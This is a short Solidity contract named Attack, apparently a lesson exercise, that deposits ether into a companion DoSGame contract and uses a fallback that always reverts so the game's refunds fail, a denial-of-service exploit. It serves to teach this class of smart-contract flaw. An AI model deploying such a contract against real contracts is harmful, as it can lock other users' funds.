// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./S09_DoSGame.sol";

contract Attack {
    fallback() external payable{
        revert("DoS Attack!");
    }

    function attack(address gameAddr) external payable {
        DoSGame dos = DoSGame(gameAddr);
        dos.deposit{value: msg.value}();
    }
}